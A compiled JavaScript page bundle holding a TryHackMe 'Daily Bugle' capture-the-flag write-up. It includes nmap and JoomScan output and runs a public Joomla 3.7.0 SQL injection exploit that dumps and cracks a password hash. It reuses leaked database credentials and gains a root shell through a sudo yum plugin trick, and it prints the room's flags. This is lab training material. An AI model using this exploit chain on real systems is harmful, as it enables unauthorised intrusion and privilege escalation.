"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8402],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>d});var a=t(67294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function r(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,a,o=function(e,n){if(null==e)return{};var t,a,o={},i=Object.keys(e);for(a=0;a<i.length;a++)t=i[a],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)t=i[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var s=a.createContext({}),p=function(e){var n=a.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):r(r({},n),e)),t},c=function(e){var n=p(e.components);return a.createElement(s.Provider,{value:n},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},h=a.forwardRef((function(e,n){var t=e.components,o=e.mdxType,i=e.originalType,s=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=p(t),h=o,d=u["".concat(s,".").concat(h)]||u[h]||m[h]||i;return t?a.createElement(d,r(r({ref:n},c),{},{components:t})):a.createElement(d,r({ref:n},c))}));function d(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var i=t.length,r=new Array(i);r[0]=h;var l={};for(var s in n)hasOwnProperty.call(n,s)&&(l[s]=n[s]);l.originalType=e,l[u]="string"==typeof e?e:o,r[1]=l;for(var p=2;p<i;p++)r[p]=t[p];return a.createElement.apply(null,r)}return a.createElement.apply(null,t)}h.displayName="MDXCreateElement"},97750:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>s,contentTitle:()=>r,default:()=>m,frontMatter:()=>i,metadata:()=>l,toc:()=>p});var a=t(87462),o=(t(67294),t(3905));const i={},r="Daily Bugle",l={unversionedId:"Tryhackme/Daily Bugle/Daily Bugle",id:"Tryhackme/Daily Bugle/Daily Bugle",title:"Daily Bugle",description:"Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.",source:"@site/writeups/Tryhackme/Daily Bugle/Daily Bugle.md",sourceDirName:"Tryhackme/Daily Bugle",slug:"/Tryhackme/Daily Bugle/",permalink:"/writeups/Tryhackme/Daily Bugle/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Cross-site Scripting",permalink:"/writeups/Tryhackme/Cross-site Scripting/"},next:{title:"Dav",permalink:"/writeups/Tryhackme/Dav/"}},s={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Deploy",id:"task-1-deploy",level:2},{value:"Task 2 Obtain user and root",id:"task-2-obtain-user-and-root",level:2},{value:"Task 3 Credits",id:"task-3-credits",level:2}],c={toc:p},u="wrapper";function m(e){let{components:n,...i}=e;return(0,o.kt)(u,(0,a.Z)({},c,i,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"daily-bugle"},"Daily Bugle"),(0,o.kt)("p",null,"Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/dailybugle"},"Daily Bugle")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Poking"),(0,o.kt)("li",{parentName:"ul"},"Enumeration (Joomla)"),(0,o.kt)("li",{parentName:"ul"},"CVE-2017-8917 - Joomla! 3.7.0"),(0,o.kt)("li",{parentName:"ul"},"Brute Forcing (Joomla)"),(0,o.kt)("li",{parentName:"ul"},"Stored Passwords & Keys"),(0,o.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-deploy"},"Task 1 Deploy"),(0,o.kt)("p",null,"Deploy the machine - it may take up to 2 minutes to configure"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Daily Bugle$ sudo nmap -A -sS -sC -sV -O 10.10.129.91\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 14:44 CEST\nNmap scan report for 10.10.129.91\nHost is up (0.038s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)\n| ssh-hostkey:\n|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)\n|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)\n|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)\n80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)\n|_http-generator: Joomla! - Open Source Content Management\n| http-robots.txt: 15 disallowed entries\n| /joomla/administrator/ /administrator/ /bin/ /cache/\n| /cli/ /components/ /includes/ /installation/ /language/\n|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/\n|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40\n|_http-title: Home\n3306/tcp open  mysql   MariaDB (unauthorized)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/13%OT=22%CT=1%CU=30379%PV=Y%DS=2%DC=T%G=Y%TM=5F85A1\nOS:55%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%II=I%TS=A)SEQ(SP=\nOS:105%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%\nOS:O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2\nOS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNS\nOS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%\nOS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%\nOS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%\nOS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%\nOS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 587/tcp)\nHOP RTT      ADDRESS\n1   36.05 ms 10.8.0.1\n2   36.60 ms 10.10.129.91\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 32.41 seconds\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Access the web server, who robbed the bank?")),(0,o.kt)("p",null,(0,o.kt)("img",{src:t(86912).Z,width:"709",height:"678"})),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"SpiderMan")),(0,o.kt)("h2",{id:"task-2-obtain-user-and-root"},"Task 2 Obtain user and root"),(0,o.kt)("p",null,"Hack into the machine and obtain the root user's credentials."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.129.91/robots.txt"},"http://10.10.129.91/robots.txt")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"   (_  _)(  _  )(  _  )(  \\/  )/ __) / __)  /__\\  ( \\( )\n  .-_)(   )(_)(  )(_)(  )    ( \\__ \\( (__  /(__)\\  )  (\n  \\____) (_____)(_____)(_/\\/\\_)(___/ \\___)(__)(__)(_)\\_)\n                        (1337.today)\n\n    --=[OWASP JoomScan\n    +---++---==[Version : 0.0.7\n    +---++---==[Update Date : [2018/09/23]\n    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo\n    --=[Code name : Self Challenge\n    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP\n\nProcessing http://10.10.129.91/ ...\n\n\n\n[+] FireWall Detector\n[++] Firewall not detected\n\n[+] Detecting Joomla Version\n[++] Joomla 3.7.0\n\n[+] Core Joomla Vulnerability\n[++] Target Joomla core is not vulnerable\n\n[+] Checking Directory Listing\n[++] directory has directory listing :\nhttp://10.10.129.91/administrator/components\nhttp://10.10.129.91/administrator/modules\nhttp://10.10.129.91/administrator/templates\nhttp://10.10.129.91/images/banners\n\n\n[+] Checking apache info/status files\n[++] Readable info/status files are not found\n\n[+] admin finder\n[++] Admin page : http://10.10.129.91/administrator/\n\n[+] Checking robots.txt existing\n[++] robots.txt is found\npath : http://10.10.129.91/robots.txt\n\nInteresting path found from robots.txt\nhttp://10.10.129.91/joomla/administrator/\nhttp://10.10.129.91/administrator/\nhttp://10.10.129.91/bin/\nhttp://10.10.129.91/cache/\nhttp://10.10.129.91/cli/\nhttp://10.10.129.91/components/\nhttp://10.10.129.91/includes/\nhttp://10.10.129.91/installation/\nhttp://10.10.129.91/language/\nhttp://10.10.129.91/layouts/\nhttp://10.10.129.91/libraries/\nhttp://10.10.129.91/logs/\nhttp://10.10.129.91/modules/\nhttp://10.10.129.91/plugins/\nhttp://10.10.129.91/tmp/\n\n\n[+] Finding common backup files name\n[++] Backup files are not found\n\n[+] Finding common log files name\n[++] error log is not found\n\n[+] Checking sensitive config.php.x file\n[++] Readable config files are not found\n\n\nYour Report : reports/10.10.129.91/\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"What is the Joomla version?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"3.7.0")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("em",{parentName:"li"},"Instead of using SQLMap, why not use a python script!")," What is Jonah's cracked password?")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/exploits/42033"},"Joomla! 3.7.0 - 'com_fields' SQL Injection")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Daily Bugle$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py\n--2020-10-13 14:53:48--  https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py\nResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.112.133\nConnecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.112.133|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 6024 (5.9K) [text/plain]\nSaving to: \u2018joomblah.py\u2019\n\njoomblah.py                                   100%[================================================================================================>]   5.88K  --.-KB/s    in 0.007s\n\n2020-10-13 14:53:48 (819 KB/s) - \u2018joomblah.py\u2019 saved [6024/6024]\n\nkali@kali:~/CTFs/tryhackme/Daily Bugle$ python joomblah.py http://10.10.129.91/\n\n    .---.    .-'''-.        .-'''-.\n    |   |   '   _    \\     '   _    \\                            .---.\n    '---' /   /` '.   \\  /   /` '.   \\  __  __   ___   /|        |   |            .\n    .---..   |     \\  ' .   |     \\  ' |  |/  `.'   `. ||        |   |          .'|\n    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |\n    |   |\\    \\     / / \\    \\     / / |  |  |  |  |  |||  __    |   |    __    | |\n    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.\n    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \\ | | |/.'''. \\\n    |   |                              |  |  |  |  |  |||     | ||   |`\" __ | | |  /    | |\n    |   |                              |__|  |__|  |__|||\\    / '|   | .'.''| | | |     | |\n __.'   '                                              |/'..' / '---'/ /   | |_| |     | |\n|      '                                               '  `'-'`       \\ \\._,\\ '/| '.    | '.\n|____.'                                                                `--'  `\" '---'   '---'\n\n [-] Fetching CSRF token\n [-] Testing SQLi\n  -  Found table: fb9j5_users\n  -  Extracting users from fb9j5_users\n [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']\n  -  Extracting sessions from fb9j5_session\nkali@kali:~/CTFs/tryhackme/Daily Bugle$ echo -n '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > johan.hash\nkali@kali:~/CTFs/tryhackme/Daily Bugle$ john johan.hash --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 for all loaded hashes\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nspiderman123     (?)\n1g 0:00:09:58 DONE (2020-10-13 15:05) 0.001670g/s 78.26p/s 78.26c/s 78.26C/s sweetsmile..speciala\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"spiderman123")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"What is the user flag?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"cd /var/www/html\nsh-4.2$ ls\nls\nLICENSE.txt\nREADME.txt\nadministrator\nbin\ncache\ncli\ncomponents\nconfiguration.php\nhtaccess.txt\nimages\nincludes\nindex.php\nlanguage\nlayouts\nlibraries\nmedia\nmodules\nplugins\nrobots.txt\ntemplates\ntmp\nweb.config.txt\nsh-4.2$ cat configuration.php\ncat configuration.php\n<?php\nclass JConfig {\n        public $offline = '0';\n        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';\n        public $display_offline_message = '1';\n        public $offline_image = '';\n        public $sitename = 'The Daily Bugle';\n        public $editor = 'tinymce';\n        public $captcha = '0';\n        public $list_limit = '20';\n        public $access = '1';\n        public $debug = '0';\n        public $debug_lang = '0';\n        public $dbtype = 'mysqli';\n        public $host = 'localhost';\n        public $user = 'root';\n        public $password = 'nv5uz9r3ZEDzVjNu';\n        public $db = 'joomla';\n        public $dbprefix = 'fb9j5_';\n        public $live_site = '';\n        public $secret = 'UAMBRWzHO3oFPmVC';\n        public $gzip = '0';\n        public $error_reporting = 'default';\n        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';\n        public $ftp_host = '127.0.0.1';\n        public $ftp_port = '21';\n        public $ftp_user = '';\n        public $ftp_pass = '';\n        public $ftp_root = '';\n        public $ftp_enable = '0';\n        public $offset = 'UTC';\n        public $mailonline = '1';\n        public $mailer = 'mail';\n        public $mailfrom = 'jonah@tryhackme.com';\n        public $fromname = 'The Daily Bugle';\n        public $sendmail = '/usr/sbin/sendmail';\n        public $smtpauth = '0';\n        public $smtpuser = '';\n        public $smtppass = '';\n        public $smtphost = 'localhost';\n        public $smtpsecure = 'none';\n        public $smtpport = '25';\n        public $caching = '0';\n        public $cache_handler = 'file';\n        public $cachetime = '15';\n        public $cache_platformprefix = '0';\n        public $MetaDesc = 'New York City tabloid newspaper';\n        public $MetaKeys = '';\n        public $MetaTitle = '1';\n        public $MetaAuthor = '1';\n        public $MetaVersion = '0';\n        public $robots = '';\n        public $sef = '1';\n        public $sef_rewrite = '0';\n        public $sef_suffix = '0';\n        public $unicodeslugs = '0';\n        public $feed_limit = '10';\n        public $feed_email = 'none';\n        public $log_path = '/var/www/html/administrator/logs';\n        public $tmp_path = '/var/www/html/tmp';\n        public $lifetime = '15';\n        public $session_handler = 'database';\n        public $shared_session = '0';\n}\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"sh-4.2$ su - jjameson\nsu - jjameson\nPassword: nv5uz9r3ZEDzVjNu\nid\nuid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)\ncd ~\nls\nuser.txt\ncat user.txt\n27a260fe3cba712cfdedb1c86d80442e\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"27a260fe3cba712cfdedb1c86d80442e")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"What is the root flag?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'[jjameson@dailybugle ~]$ sudo -l\nMatching Defaults entries for jjameson on dailybugle:\n    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR\n    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",\n    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin\n\nUser jjameson may run the following commands on dailybugle:\n    (ALL) NOPASSWD: /usr/bin/yum\n')),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/yum/#sudo"},"https://gtfobins.github.io/gtfobins/yum/#sudo")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"[jjameson@dailybugle ~]$ TF=$(mktemp -d)\n[jjameson@dailybugle ~]$ cat >$TF/x<<EOF\n> [main]\n> plugins=1\n> pluginpath=$TF\n> pluginconfpath=$TF\n> EOF\n[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF\n> [main]\n> enabled=1\n> EOF\n[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF\n> import os\n> import yum\n> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\n> requires_api_version='2.1'\n> def init_hook(conduit):\n>   os.execl('/bin/sh','/bin/sh')\n> EOF\n[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y\nLoaded plugins: y\nNo plugin match for: y\nsh-4.2# whoami\nroot\nsh-4.2# cd /root\nsh-4.2# ls\nanaconda-ks.cfg  root.txt\nsh-4.2# cat root.txt\neec3d53292b1821868266858d7fa6f79\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"eec3d53292b1821868266858d7fa6f79")),(0,o.kt)("h2",{id:"task-3-credits"},"Task 3 Credits"),(0,o.kt)("p",null,"This room uses artwork that is owned by Sony Pictures"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Found another way to compromise the machine or want to assist others in rooting it? Keep an eye on the forum post located here.")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")))}m.isMDXComponent=!0},86912:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/2020-10-13_14-46-396e800dd400ece84ed25e4ffac44e49.png"}}]);